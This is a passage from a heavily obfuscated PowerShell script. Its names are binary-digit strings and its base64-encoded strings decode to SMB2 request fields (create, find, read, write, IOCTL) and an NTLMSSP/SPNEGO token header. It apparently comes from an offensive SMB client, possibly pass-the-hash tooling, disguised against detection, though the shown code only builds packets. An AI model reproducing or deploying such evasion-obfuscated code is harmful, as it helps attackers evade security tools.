            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8ARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8ARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x08,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AVABhAGcA'))),[Byte[]](0x41,0x6c,0x53,0x69))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABBAGwAUwBpAF8AQQBsAGwAbwBjAGEAdABpAG8AbgBTAGkAegBlAA=='))),${00010000001100101})
        }
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8AVABhAGcAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x10,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8AVABhAGcAXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x04,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8ARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8ARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8AVABhAGcA'))),[Byte[]](0x4d,0x78,0x41,0x63))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABNAHgAQQBjAF8AVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
        if(${_01000111101111101} -gt 1)
        {
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        }
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AVABhAGcAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x10,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AVABhAGcAXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x04,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8ARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8ARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AVABhAGcA'))),[Byte[]](0x51,0x46,0x69,0x64))
        ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABRAEYAaQBkAF8AVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
        if(${_01000111101111101} -gt 1)
        {
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8AQwBoAGEAaQBuAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8AVABhAGcAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x10,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8AVABhAGcAXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x04,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x18,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x20,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8AVABhAGcA'))),[Byte[]](0x52,0x71,0x4c,0x73))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8AVQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAEwAZQBhAHMAZQBfAEsAZQB5AA=='))),${00110111111001000})
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAEwAZQBhAHMAZQBfAFMAdABhAHQAZQA='))),[Byte[]](0x07,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAEwAZQBhAHMAZQBfAEYAbABhAGcAcwA='))),[Byte[]](0x00,0x00,0x00,0x00))
            ${00001001110110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAcgBhAEkAbgBmAG8AXwBDAGgAYQBpAG4ARQBsAGUAbQBlAG4AdABSAHEATABzAF8ARABhAHQAYQBfAEwAZQBhAHMAZQBfAEQAdQByAGEAdABpAG8AbgA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }
    }
    return ${00001001110110101}
}
function _01010001000011110
{
    param ([Byte[]]${_10010010011001011},[Byte[]]${_01011110000101000})
    ${01100000011000000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAFMAdAByAHUAYwB0AHUAcgBlAFMAaQB6AGUA'))),[Byte[]](0x21,0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAEkAbgBmAG8ATABlAHYAZQBsAA=='))),[Byte[]](0x25))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAEYAbABhAGcAcwA='))),[Byte[]](0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAEYAaQBsAGUASQBuAGQAZQB4AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAEYAaQBsAGUASQBEAA=='))),${_10010010011001011})
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAFMAZQBhAHIAYwBoAFAAYQB0AHQAZQByAG4AXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x60,0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAFMAZQBhAHIAYwBoAFAAYQB0AHQAZQByAG4AXwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x02,0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAE8AdQB0AHAAdQB0AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x01,0x00))
    ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAFMAZQBhAHIAYwBoAFAAYQB0AHQAZQByAG4A'))),[Byte[]](0x2a,0x00))
    if(${_01011110000101000})
    {
        ${01100000011000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBGAGkAbgBkAFIAZQBxAHUAZQBzAHQARgBpAGwAZQBfAFAAYQBkAGQAaQBuAGcA'))),${_01011110000101000})
    }
    return ${01100000011000000}
}
function _10100110011100010
{
    param ([Byte[]]${_01100000100110000},[Byte[]]${_00000000001001010},[Byte[]]${_10001000101000001},[Byte[]]${_00101110011010010},[Byte[]]${_10010010011001011},[Int]${_10101101000001010})
    [Byte[]]${10110001101000110} = ,0x00 * ${_10101101000001010}
    ${00101110000010110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x29,0x00))
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwBUAHkAcABlAA=='))),${_01100000100110000})
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAG4AZgBvAEMAbABhAHMAcwA='))),${_00000000001001010})
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB1AGYAZgBlAHIATABlAG4AZwB0AGgA'))),${_10001000101000001})
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),${_00101110011010010})
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABJAG4AZgBvAHIAbQBhAHQAaQBvAG4A'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10010010011001011})
    if(${_10101101000001010} -gt 0)
    {
        ${00101110000010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${10110001101000110})
    }
    return ${00101110000010110}
}
function _00000101100010110
{
    param ([Int]${_10011010011010110},[Int64]${_00000011011011101},[Byte[]]${_10010010011001011})
    [Byte[]]${10110110011111101} = [System.BitConverter]::GetBytes(${_10011010011010110})
    [Byte[]]${00010110100001110} = [System.BitConverter]::GetBytes(${_00000011011011101})
    ${10010100011111100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGQAZABpAG4AZwA='))),[Byte[]](0x50))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${10110110011111101})
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),${00010110100001110})
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10010010011001011})
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00))
    ${10010100011111100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),[Byte[]](0x30))
    return ${10010100011111100}
}
function _00110101010001111
{
    param([Int]${_10011010011010110},[Int64]${_00000011011011101},[Byte[]]${_10010010011001011},[Byte[]]${_10101101000001010})
    [Byte[]]${10110110011111101} = [System.BitConverter]::GetBytes(${_10011010011010110})
    [Byte[]]${00010110100001110} = [System.BitConverter]::GetBytes(${_00000011011011101})
    ${01010001010111001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x70,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${10110110011111101})
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),${00010110100001110})
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10010010011001011})
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgBXAHIAaQB0AGUAUgBlAHEAdQBlAHMAdABfAEIAdQBmAGYAZQByAA=='))),${_10101101000001010})
    return ${01010001010111001}
}
function _00110110001001001
{
    param ([Byte[]]${_10010010011001011})
    ${10101110001010110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101110001010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x18,0x00))
    ${10101110001010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00))
    ${10101110001010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101110001010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10010010011001011})
    return ${10101110001010110}
}
function _01011000110010010
{
    ${01011000001110000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01011000001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${01011000001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${01011000001110000}
}
function _00010110101110000
{
    ${00111001011100010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111001011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${00111001011100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${00111001011100010}
}
function _00111010011010011()
{
    param([Byte[]]${_00000110011111000})
    ${00001010110010011} = [System.BitConverter]::GetBytes(${_00000110011111000}.Length + 2)
    ${10010010010100011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuAA=='))),[Byte[]](0x94,0x01,0x06,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBVAEkARABIAGEAbgBkAGwAZQA='))),[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBMAGUAbgBnAHQAaAA='))),${00001010110010011})
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAEkAbgBTAGkAegBlAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAE8AdQB0AFMAaQB6AGUA'))),[Byte[]](0x00,0x10,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBNAGEAeABSAGUAZgBlAHIAcgBhAGwATABlAHYAZQBsAA=='))),[Byte[]](0x04,0x00))
    ${10010010010100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBGAGkAbABlAE4AYQBtAGUA'))),${_00000110011111000})
    return ${10010010010100011}
}
function _00111111011110011
{
    param ([Byte[]]${_01100000100110000},[Byte[]]${_00000000001001010},[Byte[]]${_10010010011001011},[Byte[]]${_10101101000001010})
    [Byte[]]${00100000110000101} = [System.BitConverter]::GetBytes(${_10101101000001010}.Count)
    ${10001000011101010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x21,0x00))
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwBUAHkAcABlAA=='))),${_01100000100110000})
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAG4AZgBvAEMAbABhAHMAcwA='))),${_00000000001001010})
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIATABlAG4AZwB0AGgA'))),${00100000110000101})
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIATwBmAGYAcwBlAHQA'))),[Byte[]](0x60,0x00))
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABJAG4AZgBvAHIAbQBhAHQAaQBvAG4A'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10010010011001011})
    ${10001000011101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10101101000001010})
    return ${10001000011101010}
}
function _10101110010011100
{
    param([Byte[]]${_10011011010110001},[Byte[]]$Version)
    [Byte[]]${10110111010100001} = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]${00100111101010111} = ${10110111010100001}[0] + 32
    [Byte[]]${01000110010010111} = ${10110111010100001}[0] + 22
    [Byte[]]${01111000100101001} = ${10110111010100001}[0] + 20
    [Byte[]]${10010100010110111} = ${10110111010100001}[0] + 2
    ${01000100101000011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABDAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBJAEQA'))),[Byte[]](0x60))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABjAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBMAGUAbgBnAHQAaAA='))),${00100111101010111})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEkARAA='))),[Byte[]](0x06))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x06))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBJAEQA'))),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAA='))),[Byte[]](0xa0))
